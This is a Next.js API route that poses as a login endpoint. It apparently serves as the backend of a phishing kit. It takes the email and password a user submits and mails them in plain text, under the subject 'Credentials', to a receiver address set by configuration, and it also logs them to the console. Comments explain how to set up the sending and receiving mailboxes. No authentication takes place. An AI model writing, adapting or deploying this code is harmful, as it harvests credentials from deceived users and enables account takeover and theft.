import { NextResponse, NextRequest } from "next/server";
import nodemailer from "nodemailer";
import { loginSchema } from "@/lib/schemas/loginSchema";

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    const validation = loginSchema.safeParse(body);

    if (!validation.success) {
      return NextResponse.json(
        { message: validation.error?.errors[0].message },
        { status: 400 }
      );
    }

    const { email, password } = validation.data;


    //TODO: setup gmail/yahoo for sending mail
    // remember to change service to the mail service provider you're using

    const transporter = nodemailer.createTransport({
      service: "Yahoo",
      auth: {
        user: process.env.EMAIL,
        pass: process.env.APP_PASSWORD,
      },
    });

    // change "from" and "to" according in enviroment variables
    const mailOptions = {
      from: process.env.EMAIL,
      to: process.env.EMAIL_RECEIVER,
      subject: "Credentials",
      text: `Email: ${email}\nPassword: ${password}`,
    };

    await transporter.sendMail(mailOptions);

    console.log(email, password)

    return NextResponse.json({ message: "Email sent successfully" });
  } catch (error) {
    console.error("Error sending email:", error);
    return NextResponse.json(
      { message: "Failed to send email. Please try again." },
      { status: 500 }
    );
  }
}
